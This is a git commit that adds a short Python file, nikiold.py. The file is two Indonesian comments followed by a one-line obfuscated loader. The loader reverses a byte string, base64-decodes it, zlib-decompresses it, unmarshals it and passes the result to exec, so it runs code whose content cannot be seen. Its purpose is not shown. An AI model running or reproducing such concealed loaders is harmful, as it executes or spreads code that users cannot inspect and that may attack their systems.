dd55d56772b004b6e25b1ca343bb4f4f9763f267
ArYan KhAn <105744869+innoxentAryan@users.noreply.github.com>
2022-08-05 18:50:07 +0500

    Create nikiold.py

---
+++ nikiold.py
@@ -0,0 +1,3 @@
+# Decypt Lambda By Aldi Bachtiar rifai
+# Makasih 70 subscribe
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=cIO/FPAYUAxDeOIMaXq5UaK5nrNcs1uKspZvQMwTBqJiYoS8PmF5XjI1Wyi0l8pqXZ4TVeHYKu4aIO7YtO6U1AmpHJneY+6pzRkZmpnmnBGRUOmeUpHpze7piRFQARVqnhkXmZVSYR6iDVEZGe4TqOlReWlsbhEqruHV6pEpbp7nde4SCpYSBuVc9ZpizxFWiuHkBBVhPp6szu7S6W4qjOGvTKZpHOHoIAupOZQYGThhEZkZGbmhWYMVGSliAkAFTMAsDEzDAkZLxJe'))
